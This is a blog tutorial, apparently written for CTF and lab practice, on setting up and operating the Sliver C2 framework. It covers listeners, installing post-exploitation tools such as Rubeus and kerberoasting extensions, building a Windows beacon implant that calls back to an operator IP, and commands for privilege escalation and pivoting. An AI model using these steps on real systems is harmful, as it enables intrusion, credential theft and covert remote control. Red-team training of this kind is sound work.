<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>Getting started with Sliver C2 | serioton</title><meta name="author" content="serioton"><meta name="copyright" content="serioton"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Getting started with Sliver C2">
<meta property="og:type" content="article">
<meta property="og:title" content="Getting started with Sliver C2">
<meta property="og:url" content="https://seriotonctf.github.io/2024/06/30/Getting-started-with-Sliver-C2/index.html">
<meta property="og:site_name" content="serioton">
<meta property="og:description" content="Getting started with Sliver C2">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F7eb1f0d8-846f-4281-a5ab-685c82ffed62%2Fsliver.png?table=block&id=e322d194-1a07-4725-bbae-3fe4a66599ad&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1420&userId=&cache=v2">
<meta property="article:published_time" content="2024-06-30T13:14:31.000Z">
<meta property="article:modified_time" content="2024-08-25T22:03:32.250Z">
<meta property="article:author" content="serioton">
<meta property="article:tag" content="ctf,writeups,vulnlab,hackthebox,htb,thm,cheatsheet">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://serioton.notion.site/image/https%3A%2F%2Fprod-files-secure.s3.us-west-2.amazonaws.com%2F9163bddd-7f46-4e82-a292-895fe15866d3%2F7eb1f0d8-846f-4281-a5ab-685c82ffed62%2Fsliver.png?table=block&id=e322d194-1a07-4725-bbae-3fe4a66599ad&spaceId=9163bddd-7f46-4e82-a292-895fe15866d3&width=1420&userId=&cache=v2"><link rel="shortcut icon" href="/img/iconcat.png"><link rel="canonical" href="https://seriotonctf.github.io/2024/06/30/Getting-started-with-Sliver-C2/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"We didn't find any results for the search: ${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
  copy: {
    success: 'Copy successfully',
    error: 'Copy error',
    noSupport: 'The browser does not support'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: 'Just',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: {"chs_to_cht":"Traditional Chinese Activated Manually","cht_to_chs":"Simplified Chinese Activated Manually","day_to_night":"Dark Mode Activated Manually","night_to_day":"Light Mode Activated Manually","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  }
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'Getting started with Sliver C2',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2024-08-25 22:03:32'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = url => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      link.onload = () => resolve()
      link.onerror = () => reject()
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/cat.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">10</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/train_travel_illustration-wallpaper-1920x1080.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="serioton"><img class="site-icon" src="/img/cat.jpg"/><span class="site-name">serioton</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> Search</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Getting started with Sliver C2</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="fa-fw post-meta-icon far fa-calendar-alt"></i><span class="post-meta-label">Created</span><time datetime="2024-06-30T13:14:31.000Z" title="Created 2024-06-30 13:14:31">2024-06-30</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/cheatsheet/">cheatsheet</a></span></div><div class="meta-secondline"></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><ul>
<li><a target="_blank" rel="noopener" href="https://github.com/BishopFox/sliver">https://github.com/BishopFox/sliver</a></li>
</ul>
<h1 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h1><p>Download both the sliver-server and sliver-client from the <a target="_blank" rel="noopener" href="https://github.com/BishopFox/sliver/releases">release</a> for your platform and you are done :)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  wget https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-client_linux</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  wget https://github.com/BishopFox/sliver/releases/download/v1.5.42/sliver-server_linux</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ls</span><br><span class="line">sliver-client  sliver-server</span><br></pre></td></tr></table></figure>
<p>Now we can run the sliver-server and it will drop us in a console where we can do basically everything we expect from a C2, like generating payloads, beacons, start listeners, interact with our beacons, etc…  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">➜  ./sliver-server</span><br><span class="line">[*] Loaded 21 aliases from disk</span><br><span class="line">[*] Loaded 110 extension(s) from disk</span><br><span class="line"></span><br><span class="line">    ███████╗██╗     ██╗██╗   ██╗███████╗██████╗</span><br><span class="line">    ██╔════╝██║     ██║██║   ██║██╔════╝██╔══██╗</span><br><span class="line">    ███████╗██║     ██║██║   ██║█████╗  ██████╔╝</span><br><span class="line">    ╚════██║██║     ██║╚██╗ ██╔╝██╔══╝  ██╔══██╗</span><br><span class="line">    ███████║███████╗██║ ╚████╔╝ ███████╗██║  ██║</span><br><span class="line">    ╚══════╝╚══════╝╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝</span><br><span class="line"></span><br><span class="line">All hackers gain infect</span><br><span class="line">[*] Server v1.5.42 - 85b0e870d05ec47184958dbcb871ddee2eb9e3df</span><br><span class="line">[*] Welcome to the sliver shell, please type &#x27;help&#x27; for options</span><br><span class="line"></span><br><span class="line">[*] Check for updates with the &#x27;update&#x27; command</span><br><span class="line"></span><br><span class="line">[server] sliver &gt;</span><br></pre></td></tr></table></figure>
<h1 id="Multiplayer-Mode"><a href="#Multiplayer-Mode" class="headerlink" title="Multiplayer Mode"></a>Multiplayer Mode</h1><p>Multiplayer-mode allows multiple operators (players) to connect to the same Sliver server. Basically, you start the server and you can also start the client that will connect to the server where you get the same console, and the server can be remotely somewhere, but also it can be locally because if you accidently close the server, the beacons will have trouble connecting back to you but if you close the client nothing bad would happen, hope that makes sense.<br>To setup multiplayer mode, we need to first create a new operator and give it a name, then we tell it that the connection will come from localhost:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[server] sliver &gt; new-operator --name serioton --lhost localhost</span><br><span class="line"></span><br><span class="line">[*] Generating new client certificate, please wait ...</span><br><span class="line">[*] Saved new client config to: /home/serioton/sliver/serioton_localhost.cfg</span><br></pre></td></tr></table></figure>
<p>Now, we need to put sliver into multiplayer mode:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[server] sliver &gt; multiplayer</span><br><span class="line"></span><br><span class="line">[*] Multiplayer mode enabled!</span><br></pre></td></tr></table></figure>
<p>In another tab we can start the sliver-client and tell it to import the configurations we just generated:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">➜  ./sliver-client import /home/serioton/sliver/serioton_localhost.cfg</span><br><span class="line">2024/06/30 07:12:54 Saved new client config to: /home/serioton/.sliver-client/configs/serioton_localhost.cfg</span><br></pre></td></tr></table></figure>
<p>After that, we just start the client and it will connect to the server</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">➜  ./sliver-client</span><br><span class="line">? Select a server: serioton@localhost (2a966044d4c58511)</span><br><span class="line">Connecting to localhost:31337 ...</span><br><span class="line">[*] Loaded 21 aliases from disk</span><br><span class="line">[*] Loaded 110 extension(s) from disk</span><br><span class="line"></span><br><span class="line">.------..------..------..------..------..------.</span><br><span class="line">|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |</span><br><span class="line">| :/\: || :/\: || (\/) || :(): || (\/) || :(): |</span><br><span class="line">| :\/: || (__) || :\/: || ()() || :\/: || ()() |</span><br><span class="line">| &#x27;--&#x27;S|| &#x27;--&#x27;L|| &#x27;--&#x27;I|| &#x27;--&#x27;V|| &#x27;--&#x27;E|| &#x27;--&#x27;R|</span><br><span class="line">`------&#x27;`------&#x27;`------&#x27;`------&#x27;`------&#x27;`------&#x27;</span><br><span class="line"></span><br><span class="line">All hackers gain prowess</span><br><span class="line">[*] Server v1.5.42 - 85b0e870d05ec47184958dbcb871ddee2eb9e3df</span><br><span class="line">[*] Welcome to the sliver shell, please type &#x27;help&#x27; for options</span><br><span class="line"></span><br><span class="line">[*] Check for updates with the &#x27;update&#x27; command</span><br><span class="line"></span><br><span class="line">sliver &gt;</span><br></pre></td></tr></table></figure>
<p>We will get this message in the server</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] serioton has joined the game</span><br></pre></td></tr></table></figure>
<h1 id="Installing-the-tools"><a href="#Installing-the-tools" class="headerlink" title="Installing the tools"></a>Installing the tools</h1><p>To install all the third-party post exploitation tools, we can run the following command:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sliver &gt; armory install all</span><br><span class="line"></span><br><span class="line">? Install 21 aliases and 128 extensions? Yes</span><br><span class="line">[*] Installing alias &#x27;Rubeus&#x27; (v0.0.24) ... done!</span><br><span class="line">[*] Installing alias &#x27;SharpSecDump&#x27; (v0.0.1) ... done!</span><br><span class="line">[*] Installing alias &#x27;SharpLAPS&#x27; (v0.0.1) ... done!</span><br><span class="line">[*] Installing alias &#x27;NoPowerShell&#x27; (v0.0.2) ... done!</span><br><span class="line">[*] Installing alias &#x27;SharpChrome&#x27; (v0.0.3) ... done!</span><br><span class="line">[*] Installing alias &#x27;SharpSCCM&#x27; (v0.0.2) ... done!</span><br><span class="line">[*] Installing alias &#x27;sharpsh&#x27; (v0.0.1) ... done!</span><br><span class="line">[*] Installing alias &#x27;SharpHound v4&#x27; (v0.0.2) ... done!</span><br><span class="line">[*] Installing alias &#x27;Sharp WMI&#x27; (v0.0.2) ... done!</span><br><span class="line">[*] Installing alias &#x27;Certify&#x27; (v0.0.3) ... done!</span><br><span class="line">[*] Installing alias &#x27;SharpUp&#x27; (v0.0.1) ... done!</span><br><span class="line">[*] Installing alias &#x27;SharpRDP&#x27; (v0.0.1) ... done!</span><br><span class="line">[*] Installing alias &#x27;sqlrecon&#x27; (v0.0.3) ... done!</span><br><span class="line">[*] Installing alias &#x27;Seatbelt&#x27; (v0.0.5) ... done!</span><br><span class="line">[*] Installing alias &#x27;SharPersist&#x27; (v0.0.2) ... done!</span><br><span class="line">[*] Installing alias &#x27;Sharp Hound 3&#x27; (v0.0.2) ... done!</span><br><span class="line">[SNIP]</span><br><span class="line">[*] All packages installed</span><br></pre></td></tr></table></figure>
<p>If we want to list all the available packages, we can run the <code>armory</code> command without arguments:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">sliver &gt; armory</span><br><span class="line"></span><br><span class="line">[*] Fetching 1 armory index(es) ... done!</span><br><span class="line">[*] Fetching package information ... done!</span><br><span class="line"></span><br><span class="line"> Packages</span><br><span class="line"> Command Name                  Version   Type        Help</span><br><span class="line">============================= ========= =========== =========================================================================================================================================</span><br><span class="line"> bof-roast                     v0.0.2    Extension   Beacon Object File repo for roasting Active Directory</span><br><span class="line"> bof-servicemove               v0.0.1    Extension   Lateral movement technique by abusing Windows Perception Simulation Service to achieve DLL hijacking</span><br><span class="line"> c2tc-addmachineaccount        v0.0.9    Extension   AddMachineAccount [Computername] [Password &lt;Optional&gt;]</span><br><span class="line"> c2tc-askcreds                 v0.0.9    Extension   Collect passwords using CredUIPromptForWindowsCredentialsName</span><br><span class="line"> c2tc-domaininfo               v0.0.9    Extension   enumerate domain information using Active Directory Domain Services</span><br><span class="line"> c2tc-kerberoast               v0.0.9    Extension   A BOF tool to list all SPN enabled user/service accounts or request service tickets (TGS-REP)</span><br><span class="line"></span><br><span class="line">[SNIP]</span><br></pre></td></tr></table></figure>
<p>If we want to install a specific package, we can do so by providing the package name:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sliver &gt; armory install rubeus</span><br><span class="line"></span><br><span class="line">[*] Installing alias &#x27;Rubeus&#x27; (v0.0.24) ... done!</span><br></pre></td></tr></table></figure>
<h1 id="Basic-Commands"><a href="#Basic-Commands" class="headerlink" title="Basic Commands"></a>Basic Commands</h1><h2 id="Setup-a-listener"><a href="#Setup-a-listener" class="headerlink" title="Setup a listener"></a>Setup a listener</h2><p>To create a listener on port 53, we can use the following command:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sliver &gt; mtls --lport 53</span><br><span class="line"></span><br><span class="line">[*] Starting mTLS listener ...</span><br><span class="line"></span><br><span class="line">[*] Successfully started job #2</span><br></pre></td></tr></table></figure>
<p><code>mtls</code> means mutual TLS which is a TCP listener but the communication over it is encrypted.<br>We can also start http or https listeners:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sliver &gt; http --lport 80</span><br><span class="line"></span><br><span class="line">[*] Starting HTTP :80 listener ...</span><br><span class="line">[*] Successfully started job #3</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sliver &gt; https --lport 8443</span><br><span class="line"></span><br><span class="line">[*] Starting HTTPS :8443 listener ...</span><br><span class="line"></span><br><span class="line">[*] Successfully started job #4</span><br></pre></td></tr></table></figure>
<h2 id="List-and-kill-jobs"><a href="#List-and-kill-jobs" class="headerlink" title="List and kill jobs"></a>List and kill jobs</h2><p>We can see the listeners we have using the <code>jobs</code> command</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sliver &gt; jobs</span><br><span class="line"></span><br><span class="line"> ID   Name    Protocol   Port    Stage Profile</span><br><span class="line">==== ======= ========== ======= ===============</span><br><span class="line"> 1    grpc    tcp        31337</span><br><span class="line"> 2    mtls    tcp        53</span><br><span class="line"> 3    http    tcp        80</span><br><span class="line"> 4    https   tcp        8443</span><br></pre></td></tr></table></figure>
<p>To kill a listener, we use the command <code>jobs -k &lt;listener_id&gt;</code> and provide the listener ID we want to stop:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sliver &gt; jobs -k 3</span><br><span class="line"></span><br><span class="line">[*] Killing job #3 ...</span><br><span class="line">[!] Job #3 stopped (tcp/http)</span><br><span class="line"></span><br><span class="line">[!] Job #3 stopped (tcp/http)</span><br><span class="line"></span><br><span class="line">[*] Successfully killed job #3</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sliver &gt; jobs -k 4</span><br><span class="line"></span><br><span class="line">[*] Killing job #4 ...</span><br><span class="line">[!] Job #4 stopped (tcp/https)</span><br><span class="line"></span><br><span class="line">[*] Successfully killed job #4</span><br><span class="line"></span><br><span class="line">[!] Job #4 stopped (tcp/https)</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sliver &gt; jobs</span><br><span class="line"></span><br><span class="line"> ID   Name   Protocol   Port    Stage Profile</span><br><span class="line">==== ====== ========== ======= ===============</span><br><span class="line"> 1    grpc   tcp        31337</span><br><span class="line"> 2    mtls   tcp        53</span><br></pre></td></tr></table></figure>
<h1 id="Beacons"><a href="#Beacons" class="headerlink" title="Beacons"></a>Beacons</h1><h2 id="Generating-beacons"><a href="#Generating-beacons" class="headerlink" title="Generating beacons"></a>Generating beacons</h2><p>To generate a beacon, we can use the <code>generate beacon</code> command, in this case we generate a beacon for windows 64 bit, the format is .exe and we tell it to connect to our IP:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sliver &gt; generate beacon --seconds 30 --jitter 3 --os windows --arch amd64 --format EXECUTABLE --http &lt;IP&gt; --name meow --save /tmp/beacon.exe -G --skip-symbols</span><br><span class="line"></span><br><span class="line">[*] Generating new windows/amd64 beacon implant binary (30s)</span><br><span class="line">[!] Symbol obfuscation is disabled</span><br><span class="line">[*] Build completed in 3s</span><br><span class="line">[*] Implant saved to /tmp/beacon.exe</span><br></pre></td></tr></table></figure>
<p>The <code>-G</code> skips <code>Shikata-Ganai-Encoding</code> and <code>--skip-symbols</code> will leave sliver strings inside the binary. This reduces file size but can lead to detection.</p>
<h2 id="Listing-and-interacting-with-beacons"><a href="#Listing-and-interacting-with-beacons" class="headerlink" title="Listing and interacting with beacons"></a>Listing and interacting with beacons</h2><p>To list all the beacons we have, we can use the <code>beacons</code> command:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sliver &gt; beacons</span><br><span class="line"></span><br><span class="line"> ID         Name           Transport   Hostname    Username               Operating System   Last Check-In   Next Check-In</span><br><span class="line">========== ============== =========== =========== ====================== ================== =============== ===============</span><br><span class="line"> a7b8c0ca   mist-http      http(s)     MS01        MIST\Brandon.Keywarp   windows/amd64      257h38m33s      257h38m2s</span><br><span class="line"> 7717ce78   axlle          http(s)     MAINFRAME   AXLLE\gideon.hamill    windows/amd64      180h58m49s      180h58m18s</span><br><span class="line"> [SNIP]</span><br><span class="line"> ede730e4   meow   http(s)     DC1         BLAZORIZED\NU_1055     windows/amd64      11h50m21s       11h49m50s</span><br></pre></td></tr></table></figure>
<p>To interact with a beacon, we can run the <code>use</code> command and give it the beacon ID:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sliver &gt; use ede730e4</span><br><span class="line"></span><br><span class="line">[*] Active beacon meow (ede730e4-cc70-4552-9e7f-f4a8fa557615)</span><br><span class="line"></span><br><span class="line">sliver (meow) &gt;</span><br></pre></td></tr></table></figure>
<h1 id="Sessions"><a href="#Sessions" class="headerlink" title="Sessions"></a>Sessions</h1><p>To turn a beacon into a session, we run the <code>interactive</code> command:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sliver (meow) &gt; interactive</span><br><span class="line"></span><br><span class="line">[*] Using beacon&#x27;s active C2 endpoint: https://10.10.14.8:8443</span><br><span class="line">[*] Tasked beacon meow (8d057a41)</span><br></pre></td></tr></table></figure>
<p>This will create a running task that will open an interactive session when it’s time to execute again</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[*] Session 2b8213e1 ...</span><br></pre></td></tr></table></figure>
<p>We can list sessions using the command <code>sessions</code>. If we want to switch to the context of the session, we can do so by using the following command:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sliver (meow) &gt; use 2b8213e1-5f9e-4d4f-b003-b17e62a239c3</span><br><span class="line"></span><br><span class="line">[*] Active session meow (2b8213e1-5f9e-4d4f-b003-b17e62a239c3)</span><br></pre></td></tr></table></figure>
<h1 id="Other-useful-commands"><a href="#Other-useful-commands" class="headerlink" title="Other useful commands"></a>Other useful commands</h1><h3 id="execute-assembly"><a href="#execute-assembly" class="headerlink" title="execute-assembly"></a>execute-assembly</h3><p>With <code>execute-assembly</code> we can run a .NET assembly (DLL or exe) in memory, by spawning a new process (notepad by default) that hosts the <em>.NET-CLR</em>.</p>
<h3 id="getsystem"><a href="#getsystem" class="headerlink" title="getsystem"></a>getsystem</h3><p>Spawn a new session as NT AUTHORITY&#x2F;SYSTEM, by injecting into a system process when you are already in a high privileged shell.</p>
<h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><p>List processes and identify running security products such as AVs and EDRs.</p>
<h3 id="socks5"><a href="#socks5" class="headerlink" title="socks5"></a>socks5</h3><p>Start a socks5 proxy in your implant with socks5 start. This proxy can then be used with e.g. proxychains to tunnel your tools through the implant into the corporate network.</p>
<h3 id="sideload"><a href="#sideload" class="headerlink" title="sideload"></a>sideload</h3><p>Load and execute a shared object (shared library&#x2F;DLL) in a remote process</p>
<h1 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h1><p>This was a basic intro to sliver C2, but there’s a lot more you can do with it. Checkout the official documentation here: <a target="_blank" rel="noopener" href="https://sliver.sh/docs">https://sliver.sh/docs</a>. It’s very detailed and explains many things you can do with Sliver.</p>
<h1 id="Resources"><a href="#Resources" class="headerlink" title="Resources"></a>Resources</h1><ul>
